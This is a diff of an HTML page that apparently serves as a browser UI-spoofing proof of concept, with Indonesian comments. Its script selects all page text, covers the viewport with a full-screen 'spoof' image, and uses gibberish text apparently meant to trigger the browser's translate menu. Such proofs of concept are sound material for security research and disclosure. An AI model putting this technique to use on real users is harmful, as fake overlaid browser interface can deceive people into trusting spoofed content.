@@ -4,12 +4,10 @@
     <meta charset="UTF-8" />
     <title>Full Screen Image Trigger</title>
     <style>
-      /* Optional: Prevent scroll when image is shown */
       body.fullscreen-active {
         overflow: hidden;
       }
 
-      /* Buat div pengganti img supaya scroll */
       #scroll-filler {
         height: 10000px;
       }
@@ -28,30 +26,20 @@
     <!-- Elemen kosong untuk membuat halaman bisa discroll jauh ke bawah -->
     <div id="scroll-filler"></div>
 
-    <!-- Paragraf target untuk selectAllChildren -->
-    <p id="paragraph1">
-      <!-- Trigger Translate Menu -->
-      A[= ?:TLv S9y
-      <!-- Trigger Translate Menu -->
-    </p>
-
     <script>
       function rfsSelectAll() {
         document.execCommand("selectAll");
 
-        // Tampilkan gambar dan atur ukurannya full screen
         const img = document.getElementById("spoof");
-
         img.style.display = "block";
         img.style.position = "fixed";
         img.style.top = "0";
         img.style.left = "0";
-        img.style.width = "10vw";
+        img.style.width = "100vw";
         img.style.height = "100vh";
         img.style.objectFit = "cover";
         img.style.zIndex = "9999";
 
-        // Tambahkan class agar body tidak scroll (opsional)
         document.body.classList.add("fullscreen-active");
       }
 
@@ -66,5 +54,10 @@
         }
       }
     </script>
+
+    <!-- Dipindah ke bagian paling bawah -->
+    <p id="paragraph1">
+      A[= ?:TLv S9y
+    </p>
   </body>
 </html>
